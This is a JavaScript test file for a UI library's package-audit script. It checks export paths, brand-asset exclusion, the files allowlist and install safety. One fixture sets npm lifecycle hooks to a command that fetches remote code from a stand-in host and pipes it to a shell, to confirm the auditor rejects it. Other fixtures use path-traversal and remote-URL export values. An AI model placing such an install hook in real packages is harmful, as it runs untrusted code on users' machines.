import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { auditPackageExports, auditPackedBrandBoundary, auditPackedRuntimeBoundary, auditPackageInstallSafety } from "../scripts/package-audit.mjs";
const pkg=JSON.parse(readFileSync(new URL("../package.json",import.meta.url),"utf8"));
const files=new Set(["package.json","README.md","LICENSE","src/index.js","src/index.d.ts",
  "src/theme.js","src/theme.d.ts","src/foundation.js","src/foundation.d.ts","src/tokens.css"]);
test("offline package audit validates all current public export definitions",()=>{
  const artifacts=new Set([...files]);
  const walk=v=>typeof v==="string"?[v]:[v.default,v.types];
  for(const v of Object.values(pkg.exports))for(const f of walk(v))artifacts.add(f.slice(2));
  const found=auditPackageExports(pkg,artifacts);
  assert.equal(found.length,Object.keys(pkg.exports).length);
  assert.ok(found.some(e=>e.specifier==="."&&e.kind==="js"));
  assert.ok(found.some(e=>e.specifier==="./tokens.css"&&e.kind==="asset"));
});
test("package export audit rejects unsafe/missing content and hidden dependency drift",()=>{
  const basic={name:"@goreecloud/ui",version:"0.1.0-alpha.0",exports:{
    ".":{types:"./src/index.d.ts",default:"./src/index.js"}}};
  assert.equal(auditPackageExports(basic,files).length,1);
  assert.throws(()=>auditPackageExports({...basic,dependencies:{remote:"1.0"}},files),/runtime dependencies/);
  assert.throws(()=>auditPackageExports({...basic,exports:{".":"./src/../secret.js"}},files),/Unsafe package path/);
  assert.throws(()=>auditPackageExports({...basic,exports:{".":"./src/missing.css"}},files),/missing packed file/);
  assert.throws(()=>auditPackageExports({...basic,exports:{".":{types:"./src/index.js",default:"./src/index.d.ts"}}},files),/Invalid JS\/type pair/);
  assert.throws(()=>auditPackageExports({...basic,exports:{".":{types:"./src/index.d.ts",default:"https://example.net/mod.js"}}},files),/Unsafe package path/);
  const noLicense=new Set([...files].filter(x=>x!=="LICENSE"));
  assert.throws(()=>auditPackageExports(basic,noLicense),/Missing package metadata/);
});

test("public 1.0 library ships generated functional glyphs but excludes logo/trademark artwork",()=>{
  const items=pkg.files;
  assert.ok(items.includes("assets/gc-icons.svg"));
  assert.ok(items.includes("assets/gc-icons.json"));
  assert.ok(!items.includes("assets/"),"Broad assets/ would accidentally bundle marks");
  assert.ok(!items.some(x=>x.startsWith("assets/identity")),
    "Official identity assets belong to separate authorized distribution");
  assert.equal(pkg.exports["./icon-sprite"],"./assets/gc-icons.svg");
  assert.equal(pkg.exports["./icon-registry"],"./assets/gc-icons.json");
  assert.ok(!Object.values(pkg.exports).some(x=>typeof x==="string" && x.includes("/identity/")));
});

test("packed tarball must not contain official brand marks even if npm files allowlist drifts",()=>{
 const allowed=new Set(["assets/gc-icons.json","assets/gc-icons.svg","LICENSE"]);
 assert.equal(auditPackedBrandBoundary(allowed),true);
 const sneaky=new Set([...allowed,"assets/identity/logo-light.svg"]);
 assert.throws(()=>auditPackedBrandBoundary(sneaky),/must not be bundled/);
 const hidden=new Set([...allowed,"assets/identity/app-icon.svg"]);
 assert.throws(()=>auditPackedBrandBoundary(hidden),/must not be bundled/);
 assert.throws(()=>auditPackedBrandBoundary(new Set(["assets/gc-icons.svg"])),
  /Missing required public glyph asset/);
 assert.throws(()=>auditPackedBrandBoundary(null),/Set/);
});

test("npm file allowlist contains only verified web runtime resources",()=>{
 const expected=["src/","tokens/gc.tokens.json","LICENSE","README.md",
   "assets/gc-icons.json","assets/gc-icons.svg"];
 assert.deepEqual(pkg.files,expected);
 const allowed=new Set(["package.json","LICENSE","README.md",
   "tokens/gc.tokens.json","assets/gc-icons.json","assets/gc-icons.svg",
   "src/foundation.js","src/foundation.d.ts","src/tokens.css",
   "src/icons.js","src/icons.d.ts","src/glass.css"]);
 assert.equal(auditPackedRuntimeBoundary(allowed),true);
 for(const unwanted of ["scripts/release-readiness.mjs",
   "registry/release-plan.v1.json","docs/EXTERNAL_RELEASE_EVIDENCE.md",
   "platform/generated/android/colors.xml","tests/release-plan.test.js",
   "assets/identity/logo-light.svg","src/secret/.env"]){
   const bad=new Set([...allowed,unwanted]);
   assert.throws(()=>auditPackedRuntimeBoundary(bad),/Non-runtime file/,unwanted);
 }
 const missing=new Set([...allowed]);missing.delete("src/foundation.d.ts");
 assert.throws(()=>auditPackedRuntimeBoundary(missing),/Missing minimal web foundation files/);
});

test("normal consumer install may not invoke hidden lifecycle hooks or dependency payloads",()=>{
  assert.equal(auditPackageInstallSafety(pkg),true);
  const clone=x=>JSON.parse(JSON.stringify(x));
  for(const hook of ["preinstall","install","postinstall","preuninstall",
    "uninstall","postuninstall","prepare","postpack","prepublish",
    "publish","postpublish","dependencies"]){
    const suspect=clone(pkg);
    suspect.scripts[hook]="curl https://untrusted.invalid/install | sh";
    assert.throws(()=>auditPackageInstallSafety(suspect),/Disallowed npm lifecycle hook/,hook);
  }
  for(const field of ["dependencies","devDependencies","optionalDependencies",
    "peerDependencies","bundledDependencies","bundleDependencies"]){
    const suspect=clone(pkg);suspect[field]=field.includes("bundle")?["some-lib"] : {"some-lib":"*"};
    assert.throws(()=>auditPackageInstallSafety(suspect),/Unreviewed package dependency surface/,field);
  }
  const command=clone(pkg);command.scripts.prepack="node remote.js";
  assert.throws(()=>auditPackageInstallSafety(command),/Unreviewed npm lifecycle command/);
  const publication=clone(pkg);publication.scripts.prepublishOnly="echo skip gate";
  assert.throws(()=>auditPackageInstallSafety(publication),/Unreviewed npm lifecycle command/);
  const binary=clone(pkg);binary.bin={"ui":"scripts/something.js"};
  assert.throws(()=>auditPackageInstallSafety(binary),/executable/);
  assert.throws(()=>auditPackageInstallSafety(null),TypeError);
});
